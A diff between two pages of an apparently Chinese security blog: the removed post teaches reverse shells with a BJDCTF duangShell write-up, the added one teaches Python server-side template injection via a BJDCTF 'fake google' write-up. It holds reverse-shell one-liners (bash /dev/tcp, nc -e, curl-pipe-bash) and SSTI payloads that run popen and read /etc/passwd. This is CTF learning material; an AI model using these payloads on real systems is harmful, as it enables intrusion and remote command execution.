@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="从一次做题浅析反弹shell, Keep-Boom">
+    <meta name="keywords" content="从一道题目浅谈SSTi, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>从一次做题浅析反弹shell | Keep-Boom</title>
+    <title>从一道题目浅谈SSTi | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">从一次做题浅析反弹shell</h1>
+                    <h1 class="description center-align post-title">从一道题目浅谈SSTi</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-18
+                    2021-03-19
                 </div>
                 
 
@@ -459,65 +459,87 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="什么是shell，什么是反弹shell，为何要反弹shell"><a href="#什么是shell，什么是反弹shell，为何要反弹shell" class="headerlink" title="#什么是shell，什么是反弹shell，为何要反弹shell"></a>#什么是shell，什么是反弹shell，为何要反弹shell</h4><p>Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。shell是渗透中常用的名词，像getshell，webshell，反弹shell等等，都和shell相关。</p>
+                <h3 id="什么是模板-amp-模板注入SSTI-server-side-template-injection"><a href="#什么是模板-amp-模板注入SSTI-server-side-template-injection" class="headerlink" title="什么是模板&amp;模板注入SSTI(server-side template injection)"></a>什么是模板&amp;模板注入SSTI(server-side template injection)</h3><p>小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。</p>
+<h3 id="Python-SSTI知识点"><a href="#Python-SSTI知识点" class="headerlink" title="Python SSTI知识点"></a>Python SSTI知识点</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
 <ul>
-<li>getshell：获取到目标的命令执行权限</li>
-<li>webshell：指网站后门，通过web服务进行命令执行</li>
-<li>反弹shell：把命令行的输入输出转移到其它主机</li>
+<li><p><code>__class__</code></p>
+<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
+</li>
+<li><p><code>__bases__</code></p>
+<p>以元组的形式返回一个类所直接继承的类。</p>
+</li>
+<li><p><code>__base__</code></p>
+<p>以字符串返回一个类所直接继承的类。</p>
+</li>
+<li><p><code>__mro__</code></p>
+<p>返回解析方法调用的顺序。</p>
+</li>
+<li><p><code>__subclasses__()</code></p>
+</li>
 </ul>
-<p>反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
-<p>那么什么情况下正向连接不太好用了呢？<br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。<br>2.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>3.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
-<h3 id="常见的linux反弹shell的方法"><a href="#常见的linux反弹shell的方法" class="headerlink" title="常见的linux反弹shell的方法"></a>常见的linux反弹shell的方法</h3><p>nc又称netcat（瑞士军刀）</p>
-<ol>
-<li>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li>
-<li>端口扫描，nc可以作为client发起TCP或UDP连接</li>
-<li>机器之间传输文件</li>
-<li>机器之间网络测速</li>
-</ol>
-<p>nc的安装 </p>
-<pre><code>yum install -y nc</code></pre>
-<p>监听端口（攻击机）</p>
-<pre><code>nc -lvvp 4455  -l监听模式，用于入站连接 -p本地端口号 -v输出交互或出错信息,显示指令执行过程</code></pre>
-<h5 id="方法一：主动连接（被攻击机）"><a href="#方法一：主动连接（被攻击机）" class="headerlink" title="方法一：主动连接（被攻击机）"></a>方法一：主动连接（被攻击机）</h5><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre>
-<p>bash -i 建立一个交互式的bash</p>
-<p>/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps</p>
-<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</p>
-<p>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
-<p>#linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：<br>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;<br>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;<br>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</p>
-<p>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 </p>
-<p>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</p>
-<p>完整解读：</p>
-<p>bash产生了一个交互环境与本地主机主动发起与目标主机4455端口建立的连接（即TCP 4455 会话连接）相结合，然后在重定向个tcp 4455会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出。（简单来说就是，可以在攻击机上输入指令并接收结果，不会被被攻击者发现。</p>
-<h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>被攻击机</p>
-<pre><code>nc ip -e /bin/sh</code></pre>
-<h5 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h5><p>被攻击机</p>
-<pre><code>curl http://ip/1.txt|bash</code></pre>
-<p>注：需要先在目标内网的一台服务器下写上反弹连接一句话才可以使用</p>
-<pre><code>cd /var/www/html
-
-echo &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot; &gt; 1.txt</code></pre>
-<h4 id="CTF题目-BJDCTF-2nd-duangShell练习"><a href="#CTF题目-BJDCTF-2nd-duangShell练习" class="headerlink" title="CTF题目[BJDCTF 2nd]duangShell练习"></a>CTF题目[BJDCTF 2nd]duangShell练习</h4><p>知识：反弹shell，swp泄露</p>
-<p>当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。</p>
-<p>访问url/.index.php.swp下载文件（记住index前面有个点）</p>
-<p>放到kali上用vim恢复文件</p>
-<pre><code>vim -r index.php.swp</code></pre>
-<p><img src="/images/32.png"></p>
-<p>过滤了很多关键的东西，而且exec执行命令不会回显。需要反弹shell，这里需要自己的vps。用buu利用的不行。</p>
-<p>用xshell或者kali连接上自己的服务器。</p>
-<pre><code>ssh -p 22 用户名@ip（公网ip）
-nc -lvvp 4455</code></pre>
-<p>POST数据：</p>
-<pre><code>girl_friend=nc ip(自己服务器的公网ip) -e /bin/sh 或者 nc ip -e /bin/bash</code></pre>
-<p><img src="/images/33.png"></p>
-<p>连接成功</p>
-<pre><code>find / -name flag
-cat /etc/.../flag</code></pre>
-<p>获得flag</p>
-<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/weixin_44288604/article/details/111740527?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161605742116780265461649%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161605742116780265461649&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-111740527.first_rank_v2_pc_rank_v29&amp;utm_term=%E4%B8%BA%E4%BD%95%E8%A6%81%E5%8F%8D%E5%BC%B9shell</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/113245878?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606136716780262556128%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606136716780262556128&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113245878.first_rank_v2_pc_rank_v29&amp;utm_term=linux%E5%8F%8D%E5%BC%B9shell">https://blog.csdn.net/qq_41107295/article/details/113245878?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606136716780262556128%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606136716780262556128&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113245878.first_rank_v2_pc_rank_v29&amp;utm_term=linux%E5%8F%8D%E5%BC%B9shell</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105351352?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606213116780357231217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606213116780357231217&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-105351352.first_rank_v2_pc_rank_v29&amp;utm_term=%5BBJDCTF+2nd%5DduangShell">https://blog.csdn.net/qq_45521281/article/details/105351352?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161606213116780357231217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161606213116780357231217&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-105351352.first_rank_v2_pc_rank_v29&amp;utm_term=%5BBJDCTF+2nd%5DduangShell</a></p>
+<p>​       获取类的所有子类。</p>
+<ul>
+<li><p><strong><code>__init__</code></strong></p>
+<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>
+</li>
+<li><p><strong><code>__globals__</code></strong></p>
+<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>
+<p><strong><code>__builtins__</code></strong></p>
+<p><strong>在pyton2中为 <code>__builtins__</code> 和 <code>__builtin__</code></strong></p>
+<p>这里 <code>__builtins__</code> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p>
+<p>而 <code>__builtins__</code> 实际上是一个指向或者说引用 <code>__builtin__</code> 的（有点类似于软链接），而真正BIF在被定义时是在 <code>__builtin__</code> 模块中进行的。</p>
+<p><strong>在python3中为 <code>__builtins__</code> 和 <code>builtins</code></strong></p>
+<p>这里只不过 <code>builtins</code> 代替的 <code>__builtin__</code></p>
+<p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 <code>dir(__builtins__)</code> 可以查到。</p>
+<p><img src="/images/40.png"></p>
+</li>
+</ul>
+<h3 id="查询都哪些子类调用了-builtins-每个版本的python，子类不一样"><a href="#查询都哪些子类调用了-builtins-每个版本的python，子类不一样" class="headerlink" title="查询都哪些子类调用了__builtins__(每个版本的python，子类不一样)"></a>查询都哪些子类调用了<code>__builtins__</code>(每个版本的python，子类不一样)</h3><pre class=" language-python"><code class="language-python">search <span class="token operator">=</span> <span class="token string">'__builtins__'</span>   
+num <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    num <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> search <span class="token keyword">in</span> i<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> num<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span></code></pre>
+<p>在SSTI中，我们要做的无非就两个：</p>
+<ul>
+<li>执行命令</li>
+<li>获取文件内容</li>
+</ul>
+<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>直接回车搜索出现参数name</p>
+<p><img src="/images/34.png"></p>
+<p>输入1，回显出1。猜测是模板注入。</p>
+<pre><code>payload=&#123;&#123;6*6&#125;&#125;   回显36，存在模板注入。</code></pre>
+<p><img src="/images/35.png"></p>
+<p>注入思路，虽然当前的类底下可能没有可以执行命令的方法，但可以找到它的基类下的其他子类，进行命令执行。</p>
+<pre><code>payload=&#123;&#123;''.__class__&#125;&#125;</code></pre>
+<p>回显对象所对应的类，这里是字符型。当然前面的‘’可以换成其他的，像（），[]等。</p>
+<p><img src="/images/36.png"></p>
+<p>下一步找到类所对应的基类object</p>
+<pre><code>payload=&#123;&#123;''.__class__.__mro__&#125;&#125;  注：除了mro 还可以使用base 和 bases</code></pre>
+<p><img src="/images/37.png"></p>
+<p>下一步找到其底下的所有子类</p>
+<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre>
+<p><img src="/images/38.png"></p>
+<p>接下来就是找能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。例如file类和os._wrap_close类</p>
+<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre>
+<p><img src="/images/39.png"></p>
+<p>最后cat下就行</p>
+<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
+<h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><p>#threading.Semaphore</p>
+<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code></pre>
+<p>#os._wrap_close</p>
+<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
+<p>#warnings.catch_warnings</p>
+<pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
+<p>#file</p>
+<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/tmp/..','w').write()&#125;&#125;</code></pre>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-1">https://xz.aliyun.com/t/6885#toc-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226900">https://www.anquanke.com/post/id/226900</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google">https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google</a></p>
 
             </div>
             <hr/>
@@ -543,7 +565,7 @@ cat /etc/.../flag</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/18/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%9A%E9%A2%98%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell/">http://example.com/2021/03/18/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%9A%E9%A2%98%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell/</a>
+                    <a href="http://example.com/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">http://example.com/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -748,9 +770,10 @@ cat /etc/.../flag</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">
                     <div class="card-image">
@@ -768,9 +791,9 @@ cat /etc/.../flag</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -779,6 +802,7 @@ cat /etc/.../flag</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -789,13 +813,13 @@ cat /etc/.../flag</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/15/OneThink1-0%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/">
+                <a href="/2021/03/18/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%9A%E9%A2%98%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="OneThink1.0文件缓存漏洞">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="从一次做题浅析反弹shell">
                         
-                        <span class="card-title">OneThink1.0文件缓存漏洞</span>
+                        <span class="card-title">从一次做题浅析反弹shell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -806,7 +830,7 @@ cat /etc/.../flag</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
                             </span>
                         <span class="publish-author">
                             
